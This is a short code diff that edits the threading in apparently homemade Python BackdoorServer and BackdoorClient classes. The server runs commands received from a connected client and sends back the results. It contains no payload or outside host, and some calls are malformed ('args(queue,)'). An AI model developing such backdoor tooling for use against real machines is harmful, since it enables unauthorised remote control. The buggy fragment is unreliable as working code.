@@ -155,8 +155,7 @@ class BackdoorServer(object):
             while not self.client:
                 self.listen()
 
-            file_watch = Thread(target=self.recv_command, args(queue,))
-            file_watch.setDaemon(True)
+            
             result_send = Thread(target=self.send_result, args(queue,result))
             result_send.setDaemon(True)
             
@@ -168,12 +167,13 @@ class BackdoorServer(object):
                         print("{} disconnected.".format(self.client))
                         self.client = None
                         break
-
-                    result = cmd.run()
+                    file_watch = Thread(target=cmd.run, args(queue,))
+                    file_watch.setDaemon(True)
+                    #result = cmd.run()
 
                     print("")
                     print(str(cmd))
-                    print(str(result))
+                    #print(str(result))
                     print("")
 
                     result_send.start()
@@ -395,7 +395,7 @@ class BackdoorClient(object):
                 try:
                     result_recv.start()
                     command_send.start()
-
+                    
                 except KeyboardInterrupt:
                     print("see ya")
                     sys.exit(0)
